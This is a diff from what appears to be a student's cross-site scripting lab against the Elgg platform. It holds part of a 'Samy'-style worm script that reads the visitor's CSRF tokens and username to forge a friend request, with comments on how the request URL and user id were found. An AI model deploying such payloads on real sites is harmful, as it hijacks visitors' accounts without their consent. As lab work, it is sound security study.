@@ -4,7 +4,20 @@
 	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
 	var token="&__elgg_token="+elgg.security.token.__elgg_token;
 	var thisprofilename=elgg.session.user.username;
-	//Construct the HTTP request to add Samy as a friend.
+
+	// At first I went to the page to send Samy a friend request and then from the inspect element 
+	// I went to the  use the chrome developer tools(inspect element) and from there found a get request.
+	// The get request gave me the url.
+	
+	// After getting the url ,now it was needed to check if the id from where I am sending request is not Samy,
+	// to prevent Samy from being attacked by the cod. For that I used view page source and found a elgg json object.
+	
+	// From there I got the userId of the person visiting Samy's profile.
+	
+	// I just used  a  if condition to check if the person was not Samy himself.
+
+
+
 
 	if(thisprofilename!="samy")
 		{
